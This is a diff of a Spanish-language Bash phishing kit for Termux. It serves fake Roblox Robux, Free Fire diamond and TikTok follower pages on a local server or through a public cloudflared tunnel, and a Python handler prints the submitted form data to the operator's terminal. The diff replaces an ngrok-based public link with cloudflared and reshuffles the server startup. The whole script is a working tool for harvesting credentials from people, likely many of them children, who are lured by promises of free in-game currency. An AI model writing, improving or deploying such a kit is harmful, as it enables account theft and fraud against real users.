@@ -19,13 +19,13 @@ echo "  ╚══════╝╚══════╝╚═╝  ╚═╝  �
 echo -e "${AMARILLO}        [ WEB SERVER DEPLOYER v3.0 ]${NC}\n"
 
 # ============================================
-# FUNCIONES HTML (SOLO 3 EJEMPLOS PARA AHORRAR ESPACIO)
+# FUNCIÓN HTML PARA ROBLOX
 # ============================================
 html_roblox() {
 cat << 'EOF'
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Roblox - Robux</title>
+<head><meta charset="UTF-8"><title>🎮 Roblox - Robux</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:Arial;background:linear-gradient(135deg,#1a1a2e,#16213e);min-height:100vh;display:flex;justify-content:center;align-items:center}
@@ -81,7 +81,7 @@ html_freefire() {
 cat << 'EOF'
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Free Fire - Diamantes</title>
+<head><meta charset="UTF-8"><title>🔥 Free Fire - Diamantes</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:Arial;background:linear-gradient(135deg,#0a0a0a,#1a0a0a);min-height:100vh;display:flex;justify-content:center;align-items:center}
@@ -137,7 +137,7 @@ html_tiktok() {
 cat << 'EOF'
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TikTok - Seguidores</title>
+<head><meta charset="UTF-8"><title>📱 TikTok - Seguidores</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:Arial;background:linear-gradient(135deg,#010101,#1a1a1a);min-height:100vh;display:flex;justify-content:center;align-items:center}
@@ -190,7 +190,7 @@ EOF
 }
 
 # ============================================
-# FUNCIÓN PARA OBTENER HTML SEGÚN APP
+# FUNCIÓN PARA OBTENER HTML
 # ============================================
 get_html() {
     local app="$1"
@@ -198,7 +198,7 @@ get_html() {
         "Roblox") html_roblox ;;
         "Free Fire") html_freefire ;;
         "TikTok") html_tiktok ;;
-        *) 
+        *)
             echo '<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><title>Servidor</title>
@@ -227,7 +227,6 @@ input{width:100%;padding:12px;margin:10px 0;border-radius:8px;border:none}
 # ============================================
 # MENÚ PRINCIPAL
 # ============================================
-
 APPS=("Roblox" "Free Fire" "TikTok")
 
 echo -e "${BLANCO}[+] Módulos disponibles (${#APPS[@]} en total):${NC}\n"
@@ -246,7 +245,7 @@ while true; do
     if [[ "$app_choice" =~ ^[0-9]+$ ]] && [ "$app_choice" -ge 1 ] && [ "$app_choice" -le "${#APPS[@]}" ]; then
         break
     else
-        echo -e "${ROJO}[!] Selección inválida. Ingresa un número de 1 a ${#APPS[@]}.${NC}"
+        echo -e "${ROJO}[!] Selección inválida.${NC}"
     fi
 done
 
@@ -254,7 +253,7 @@ SELECTED_APP="${APPS[$((app_choice-1))]}"
 echo -e "${VERDE}[✔] Módulo seleccionado: ${BLANCO}$SELECTED_APP${NC}\n"
 
 # ============================================
-# SELECCIÓN DE ALCANCE DE RED
+# SELECCIÓN DE ALCANCE
 # ============================================
 echo -e "${BLANCO}[+] Alcance de red:${NC}"
 echo -e "  ${AMARILLO}[1]${NC} Local (Solo dispositivos en tu Wi-Fi)"
@@ -271,7 +270,7 @@ HTML_CONTENT=$(get_html "$SELECTED_APP")
 echo "$HTML_CONTENT" > ~/mi_web/index.html
 
 # ============================================
-# INSTALAR PYTHON
+# INSTALAR PYTHON Y CLOUDFLARED
 # ============================================
 pkg install python -y > /dev/null 2>&1
 
@@ -285,6 +284,7 @@ echo -e "${CYAN}==================================================${NC}\n"
 # ============================================
 fuser -k 8080/tcp 2>/dev/null
 pkill -f "python3" 2>/dev/null
+pkill -f "cloudflared" 2>/dev/null
 sleep 2
 
 # ============================================
@@ -293,44 +293,33 @@ sleep 2
 cd ~/mi_web
 
 # ============================================
-# MÉTODO 1: USAR SERVICIO PÚBLICO GRATUITO (NO NGROK)
+# INICIAR SERVIDOR PYTHON EN SEGUNDO PLANO
 # ============================================
-if [ "$net_choice" == "2" ]; then
-    echo -e "${AMARILLO}[*] Usando servicio público alternativo...${NC}"
-    
-    # USAR NGROK CON UN COMANDO SIMPLE (YA VIENE INSTALADO)
-    if command -v ngrok &> /dev/null; then
-        echo -e "${AMARILLO}[*] Usando ngrok...${NC}"
-        nohup ngrok http 8080 > /dev/null 2>&1 &
-        sleep 5
-        NGROK_URL=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | grep -o 'https://[a-zA-Z0-9.-]*\.ngrok.io' | head -1)
-        
-        if [ -n "$NGROK_URL" ]; then
-            echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-            echo -e "${VERDE}🌐 ENLACE PÚBLICO:${NC}"
-            echo -e "${AMARILLO}  📎 $NGROK_URL${NC}"
-            echo -e "${BLANCO}  (¡Cualquier persona en el mundo puede acceder!)${NC}"
-            echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
-        else
-            echo -e "${ROJO}[!] Error con ngrok. Usando localhost...${NC}"
-            net_choice="1"
-        fi
-    else
-        # SI NGROK NO ESTÁ INSTALADO, USAR IP PÚBLICA
-        echo -e "${AMARILLO}[*] Ngrok no instalado, usando IP pública...${NC}"
-        PUBLIC_IP=$(curl -s ifconfig.me)
-        echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-        echo -e "${VERDE}🌐 ENLACE PÚBLICO:${NC}"
-        echo -e "${AMARILLO}  📎 http://$PUBLIC_IP:8080${NC}"
-        echo -e "${BLANCO}  (Requiere abrir puerto en tu router)${NC}"
-        echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
-    fi
-fi
+nohup python3 -m http.server 8080 > /dev/null 2>&1 &
+sleep 2
 
 # ============================================
-# MOSTRAR ENLACES LOCALES
+# SI ES PÚBLICO, USAR CLOUDFLARED (SIN TOKEN)
 # ============================================
-if [ "$net_choice" == "1" ]; then
+if [ "$net_choice" == "2" ]; then
+    echo -e "${AMARILLO}[*] Generando enlace público con Cloudflare...${NC}"
+    
+    # Verificar si cloudflared está instalado
+    if ! command -v cloudflared &> /dev/null; then
+        echo -e "${ROJO}[!] Cloudflared no instalado. Instalando...${NC}"
+        pkg install cloudflared -y
+    fi
+    
+    # Iniciar cloudflared (muestra el link en la terminal)
+    echo -e "${VERDE}[✔] Abriendo túnel Cloudflare...${NC}"
+    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${VERDE}🌐 BUSCA TU ENLACE PÚBLICO AQUÍ ABAJO:${NC}"
+    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
+    
+    # Ejecutar cloudflared en primer plano para que muestre el link
+    cloudflared tunnel --url http://localhost:8080
+else
+    # MODO LOCAL
     IP_LOCAL=$(ifconfig 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1)
     
     echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
@@ -342,15 +331,12 @@ if [ "$net_choice" == "1" ]; then
         echo -e "${BLANCO}  (Para dispositivos en tu Wi-Fi)${NC}"
     fi
     echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
-fi
-
-echo -e "${VERDE}📥 Los datos aparecerán en esta terminal${NC}"
-echo -e "${BLANCO}Presiona Ctrl+C para detener.${NC}\n"
-
-# ============================================
-# SERVIDOR PYTHON CON MANEJO DE POST
-# ============================================
-python3 << 'PYTHON_SCRIPT'
+    
+    echo -e "${VERDE}📥 Los datos aparecerán en esta terminal${NC}"
+    echo -e "${BLANCO}Presiona Ctrl+C para detener.${NC}\n"
+    
+    # Servidor con manejo de POST
+    python3 << 'PYTHON_SCRIPT'
 import http.server
 import socketserver
 import urllib.parse
@@ -398,3 +384,4 @@ print("📡 Esperando datos...\n")
 with socketserver.TCPServer(("0.0.0.0", PORT), DataHandler) as httpd:
     httpd.serve_forever()
 PYTHON_SCRIPT
+fi
